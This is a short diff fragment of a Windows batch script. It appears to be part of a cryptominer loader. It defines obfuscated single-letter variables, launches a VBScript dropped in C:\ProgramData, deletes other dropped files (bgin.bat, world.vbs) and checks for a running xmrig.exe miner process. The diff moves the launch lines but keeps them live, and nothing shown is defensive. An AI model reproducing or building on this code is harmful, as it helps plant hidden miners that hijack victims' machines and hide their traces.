@@ -1,7 +1,3 @@
-@echo off
-start "" "C:\ProgramData\PSU\samba.vbs"
-start "" "C:\ProgramData\PSU\samba.vbs"
-:start
 set aa=a
 set aaa=b
 set aaaa=c
@@ -54,6 +50,9 @@ set bbbbbbbbbbbbbbbbbbbbbbbb=W
 set bbbbbbbbbbbbbbbbbbbbbbbbb=X
 set bbbbbbbbbbbbbbbbbbbbbbbbbb=Y
 set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
+@echo off
+start "" "C:\ProgramData\PSU\samba.vbs"
+:start
 del "C:\ProgramData\bgin.bat"
 del "C:\ProgramData\world.vbs"
 tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
